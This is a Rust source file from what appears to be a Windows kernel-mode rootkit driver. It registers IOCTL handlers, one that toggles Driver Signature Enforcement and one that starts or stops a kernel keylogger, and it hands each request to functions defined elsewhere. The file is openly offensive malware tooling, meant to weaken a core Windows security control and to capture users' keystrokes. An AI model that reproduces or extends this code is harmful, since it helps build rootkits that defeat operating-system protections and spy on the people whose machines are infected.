use {
    super::keylogger::set_keylogger_state, 
    crate::{driver::Driver, handle_driver, utils::ioctls::IoctlHandler}, 
    alloc::boxed::Box, 
    hashbrown::HashMap, 
    shared::{ioctls::{IOCTL_ENABLE_DSE, IOCTL_KEYLOGGER}, 
    structs::{Keylogger, DSE}}, 
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
};

pub fn get_misc_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {

    // Responsible for enabling/disabling DSE.
    ioctls.insert(IOCTL_ENABLE_DSE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_ENABLE_DSE");

        let status = unsafe { handle_driver!(stack, Driver::set_dse_state, DSE) };
        
        unsafe { (*irp).IoStatus.Information = 0 };
        
        match status {
            Ok(_) => STATUS_SUCCESS,
            Err(err_code) => err_code
        }
    }) as IoctlHandler);

    // Start / Stop Keylogger
    ioctls.insert(IOCTL_KEYLOGGER, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        log::info!("Received IOCTL_KEYLOGGER");
        let status = unsafe { handle_driver!(stack, set_keylogger_state, Keylogger) };
        unsafe { (*irp).IoStatus.Information = 0 };
        status
    }) as IoctlHandler);
}